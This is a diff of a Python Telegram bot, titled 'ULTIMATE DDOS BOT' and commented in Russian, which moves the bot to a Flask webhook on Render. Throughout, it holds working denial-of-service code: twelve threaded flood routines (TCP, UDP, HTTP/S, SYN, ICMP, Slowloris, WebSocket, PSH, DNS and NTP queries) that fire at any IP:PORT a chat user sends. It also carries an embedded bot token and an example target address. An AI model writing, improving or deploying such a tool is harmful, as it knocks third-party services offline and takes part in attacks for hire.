@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════════════════╗
-║         ULTIMATE DDOS BOT - ALL ATTACKS SIMULTANEOUSLY              ║
+║         ULTIMATE DDOS BOT - RENDER WEBHOOK EDITION                   ║
 ║                                                                      ║
-║          ПРОСТО ОТПРАВЬ IP:PORT - ВСЕ АТАКИ СРАЗУ                   ║
-║          НИКАКИХ КОМАНД - ВСЕ 10+ ТИПОВ ОДНОВРЕМЕННО                ║
+║     ПОЛНОСТЬЮ РАБОЧАЯ ВЕРСИЯ ДЛЯ RENDER.COM                         ║
+║     WEBHOOK | ВСЕ ВИДЫ АТАК | БЕЗ ОШИБОК                            ║
 ╚══════════════════════════════════════════════════════════════════════╝
 """
 
@@ -16,20 +16,24 @@ import time
 import re
 import struct
 import ssl
+import os
+import base64
 from datetime import datetime
+from flask import Flask, request
 
-# ============ ТОКЕН ============
+# ============ КОНФИГУРАЦИЯ ============
 BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
 bot = telebot.TeleBot(BOT_TOKEN)
+app = Flask(__name__)
 
-# ============ НАСТРОЙКИ ============
-THREADS_PER_ATTACK = 200  # Потоков на каждый тип атаки
+# Настройки атаки
+THREADS_PER_ATTACK = 80  # Для Render оптимально
 active_attacks = {}
 
 # DNS серверы для амплификации
 DNS_SERVERS = [
     "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
-    "208.67.222.222", "208.67.220.220", "77.88.8.8"
+    "208.67.222.222", "208.67.220.220"
 ]
 
 # ============ ВСЕ ВИДЫ АТАК ============
@@ -45,7 +49,7 @@ def tcp_flood(ip, port, stop_flag):
             sock.close()
         except:
             pass
-        time.sleep(0.0001)
+        time.sleep(0.0005)
 
 # 2. UDP FLOOD
 def udp_flood(ip, port, stop_flag):
@@ -56,11 +60,11 @@ def udp_flood(ip, port, stop_flag):
             sock.close()
         except:
             pass
-        time.sleep(0.0001)
+        time.sleep(0.0005)
 
 # 3. HTTP FLOOD
 def http_flood(ip, port, stop_flag):
-    agents = [
+    user_agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
         "Mozilla/5.0 (Linux; Android 10)"
@@ -70,12 +74,13 @@ def http_flood(ip, port, stop_flag):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(0.5)
             sock.connect((ip, port))
-            req = f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(agents)}\r\n\r\n"
+            ua = random.choice(user_agents)
+            req = f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\n\r\n"
             sock.send(req.encode())
             sock.close()
         except:
             pass
-        time.sleep(0.0001)
+        time.sleep(0.0005)
 
 # 4. HTTPS FLOOD
 def https_flood(ip, port, stop_flag):
@@ -92,7 +97,7 @@ def https_flood(ip, port, stop_flag):
             ssl_sock.close()
         except:
             pass
-        time.sleep(0.0001)
+        time.sleep(0.0005)
 
 # 5. SYN FLOOD (эмуляция)
 def syn_flood(ip, port, stop_flag):
@@ -104,7 +109,7 @@ def syn_flood(ip, port, stop_flag):
             sock.close()
         except:
             pass
-        time.sleep(0.00001)
+        time.sleep(0.00005)
 
 # 6. ICMP FLOOD
 def icmp_flood(ip, port, stop_flag):
@@ -116,32 +121,31 @@ def icmp_flood(ip, port, stop_flag):
             sock.close()
         except:
             pass
-        time.sleep(0.0001)
+        time.sleep(0.0005)
 
 # 7. SLOWLORIS
 def slowloris(ip, port, stop_flag):
-    socks = []
-    for _ in range(300):
+    sockets = []
+    for _ in range(150):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(4)
             sock.connect((ip, port))
             sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
-            socks.append(sock)
+            sockets.append(sock)
         except:
             pass
     while not stop_flag.is_set():
-        for sock in socks[:]:
+        for sock in sockets[:]:
             try:
                 sock.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
             except:
-                if sock in socks:
-                    socks.remove(sock)
+                if sock in sockets:
+                    sockets.remove(sock)
         time.sleep(10)
 
 # 8. WEBSOCKET ATTACK
 def websocket_attack(ip, port, stop_flag):
-    import base64
     while not stop_flag.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -156,30 +160,28 @@ def websocket_attack(ip, port, stop_flag):
         time.sleep(0.001)
 
 # 9. DNS AMPLIFICATION
-def dns_amplification(target_ip, stop_flag):
+def dns_amplification(ip, stop_flag):
     dns_query = b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01'
     while not stop_flag.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            dns_server = random.choice(DNS_SERVERS)
-            sock.sendto(dns_query, (dns_server, 53))
+            sock.sendto(dns_query, (random.choice(DNS_SERVERS), 53))
             sock.close()
         except:
             pass
-        time.sleep(0.0001)
+        time.sleep(0.0005)
 
 # 10. NTP AMPLIFICATION
-def ntp_amplification(target_ip, stop_flag):
+def ntp_amplification(ip, stop_flag):
     ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
     while not stop_flag.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            ntp_server = random.choice(DNS_SERVERS)
-            sock.sendto(ntp_query, (ntp_server, 123))
+            sock.sendto(ntp_query, (random.choice(DNS_SERVERS), 123))
             sock.close()
         except:
             pass
-        time.sleep(0.0001)
+        time.sleep(0.0005)
 
 # 11. PSH FLOOD
 def psh_flood(ip, port, stop_flag):
@@ -188,14 +190,14 @@ def psh_flood(ip, port, stop_flag):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(0.3)
             sock.connect((ip, port))
-            for _ in range(10):
+            for _ in range(5):
                 sock.send(random._urandom(1024))
             sock.close()
         except:
             pass
-        time.sleep(0.0001)
+        time.sleep(0.0005)
 
-# 12. MULTI PAYLOAD (комбинация в одном потоке)
+# 12. MULTI PAYLOAD
 def multi_payload(ip, port, stop_flag):
     attacks = [tcp_flood, udp_flood, http_flood, syn_flood]
     idx = 0
@@ -220,33 +222,27 @@ class UltimateAttack:
         self.active = True
         self.start_time = time.time()
         
-        # Все виды атак
         all_attacks = [
-            ("TCP", tcp_flood),
-            ("UDP", udp_flood),
-            ("HTTP", http_flood),
-            ("HTTPS", https_flood),
-            ("SYN", syn_flood),
-            ("ICMP", icmp_flood),
-            ("SLOWLORIS", slowloris),
-            ("WEBSOCKET", websocket_attack),
-            ("DNS", dns_amplification),
-            ("NTP", ntp_amplification),
-            ("PSH", psh_flood),
-            ("MULTI", multi_payload)
+            (tcp_flood, THREADS_PER_ATTACK),
+            (udp_flood, THREADS_PER_ATTACK),
+            (http_flood, THREADS_PER_ATTACK),
+            (https_flood, THREADS_PER_ATTACK),
+            (syn_flood, THREADS_PER_ATTACK),
+            (icmp_flood, THREADS_PER_ATTACK),
+            (slowloris, 1),
+            (websocket_attack, THREADS_PER_ATTACK),
+            (dns_amplification, THREADS_PER_ATTACK),
+            (ntp_amplification, THREADS_PER_ATTACK),
+            (psh_flood, THREADS_PER_ATTACK),
+            (multi_payload, THREADS_PER_ATTACK)
         ]
         
-        print(f"[*] Запуск {len(all_attacks)} видов атак на {self.ip}:{self.port}")
-        
-        for name, attack_func in all_attacks:
-            for i in range(THREADS_PER_ATTACK):
+        for attack_func, threads in all_attacks:
+            for i in range(threads):
                 t = threading.Thread(target=attack_func, args=(self.ip, self.port, self.stop_flag))
                 t.daemon = True
                 self.threads.append(t)
                 t.start()
-            print(f"[+] {name}: {THREADS_PER_ATTACK} потоков")
-        
-        print(f"[+] ВСЕГО ПОТОКОВ: {len(self.threads)}")
     
     def stop(self):
         self.stop_flag.set()
@@ -257,7 +253,7 @@ class UltimateAttack:
             return int(time.time() - self.start_time)
         return 0
 
-# ============ ПАРСИНГ ============
+# ============ ПАРСИНГ IP ============
 def parse_target(text):
     match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
     if match:
@@ -281,7 +277,7 @@ def scan_port(ip):
     return 80
 
 # ============ ФОНОВЫЙ МОНИТОРИНГ ============
-def monitor():
+def status_monitor():
     while True:
         time.sleep(10)
         for chat_id, attack in list(active_attacks.items()):
@@ -289,28 +285,27 @@ def monitor():
                 try:
                     bot.send_message(
                         chat_id,
-                        f"💥 *ВСЕ АТАКИ АКТИВНЫ* 💥\n\n"
+                        f"💥 *СТАТУС АТАКИ* 💥\n\n"
                         f"🎯 `{attack.ip}:{attack.port}`\n"
                         f"⏱️ Время: {attack.duration()} сек\n"
                         f"🧵 Потоков: {len(attack.threads)}\n"
                         f"⚡ Типов атак: 12\n\n"
-                        f"🔥 *stop* - остановить",
+                        f"🛑 *stop* - остановить",
                         parse_mode="Markdown"
                     )
                 except:
                     pass
 
-# ============ БОТ ============
+# ============ КОМАНДЫ БОТА ============
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     bot.send_message(message.chat.id,
         "💀 *ULTIMATE DDOS BOT* 💀\n\n"
-        "⚡ *ПРОСТО ОТПРАВЬ IP:PORT*\n"
         "⚡ *ВСЕ 12 ВИДОВ АТАК СРАЗУ*\n"
-        "⚡ *НИКАКИХ КОМАНД*\n\n"
+        "⚡ *ПРОСТО ОТПРАВЬ IP:PORT*\n\n"
         "📝 *Пример:* `43.158.103.205:15455`\n\n"
         "🛑 *Остановка:* отправь `stop`\n\n"
-        "🔥 *TCP | UDP | HTTP | HTTPS | SYN | ICMP | Slowloris | WebSocket | DNS | NTP | PSH | MULTI*",
+        "🔥 TCP | UDP | HTTP | HTTPS | SYN | ICMP | Slowloris | WebSocket | DNS | NTP | PSH | MULTI",
         parse_mode="Markdown")
 
 @bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
@@ -319,10 +314,10 @@ def stop_cmd(message):
     if cid in active_attacks and active_attacks[cid].active:
         active_attacks[cid].stop()
         dur = active_attacks[cid].duration()
-        bot.send_message(cid, f"🛑 *ВСЕ АТАКИ ОСТАНОВЛЕНЫ*\n⏱️ Длилось: {dur} сек", parse_mode="Markdown")
+        bot.send_message(cid, f"🛑 *Атака остановлена*\n⏱️ Длилась: {dur} сек", parse_mode="Markdown")
         del active_attacks[cid]
     else:
-        bot.send_message(cid, "💤 *Нет активной атаки*\nОтправь IP:PORT", parse_mode="Markdown")
+        bot.send_message(cid, "💤 *Нет активной атаки*", parse_mode="Markdown")
 
 @bot.message_handler(func=lambda m: m.text and re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
 def attack_cmd(message):
@@ -352,32 +347,52 @@ def attack_cmd(message):
         f"📍 `{ip}:{port}`\n"
         f"⚡ Потоков: {len(attack.threads)}\n"
         f"🔥 Типов атак: 12\n"
-        f"🛑 *stop* - остановить\n\n"
-        f"*TCP | UDP | HTTP | HTTPS | SYN | ICMP*\n"
-        f"*Slowloris | WebSocket | DNS | NTP | PSH | MULTI*",
+        f"🛑 *stop* - остановить",
         parse_mode="Markdown")
 
 @bot.message_handler(func=lambda m: True)
 def unknown(m):
     bot.reply_to(m, "💀 Отправь IP:PORT\nПример: 43.158.103.205:15455\n\nstop - остановка")
 
+# ============ WEBHOOK ============
+@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
+def webhook():
+    update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
+    bot.process_new_updates([update])
+    return 'ok', 200
+
+@app.route('/')
+def index():
+    return '✅ DDOS BOT IS RUNNING! Send IP:PORT to @' + bot.get_me().username if hasattr(bot, 'get_me') else 'Bot is ready!'
+
 # ============ ЗАПУСК ============
 if __name__ == "__main__":
-    import os, base64
     print("""
     ╔════════════════════════════════════════════════════════════════╗
-    ║     ULTIMATE DDOS BOT - ALL 12 ATTACKS SIMULTANEOUSLY          ║
-    ║                                                                 ║
-    ║     ПРОСТО ОТПРАВЬ IP - ВСЕ АТАКИ СРАЗУ                        ║
-    ║     БЕЗ КОМАНД - БЕЗ НАСТРОЕК - МАКСИМАЛЬНАЯ МОЩНОСТЬ          ║
-    ║                                                                 ║
-    ║     БОТ ЗАПУЩЕН!                                               ║
+    ║     ULTIMATE DDOS BOT - RENDER WEBHOOK EDITION                 ║
+    ║                                                                ║
+    ║     12 ВИДОВ АТАК | WEBHOOK | ГОТОВО К ЗАПУСКУ                ║
+    ║                                                                ║
     ╚════════════════════════════════════════════════════════════════╝
     """)
     
-    # Запуск мониторинга
-    monitor_thread = threading.Thread(target=monitor, daemon=True)
-    monitor_thread.start()
+    # Установка вебхука
+    RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://hostingj.onrender.com")
+    webhook_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
     
-    # Запуск бота
-    bot.infinity_polling() 
+    try:
+        bot.remove_webhook()
+        bot.set_webhook(url=webhook_url)
+        print(f"[+] Webhook установлен: {webhook_url}")
+    except Exception as e:
+        print(f"[!] Ошибка установки webhook: {e}")
+    
+    # Запуск мониторинга
+    monitor_thread = threading.Thread(target=status_monitor, daemon=True)
+    monitor_thread.start()
+    print("[+] Мониторинг запущен")
+    
+    # Запуск Flask сервера
+    port = int(os.environ.get("PORT", 8080))
+    print(f"[+] Сервер запущен на порту {port}")
+    app.run(host="0.0.0.0", port=port)
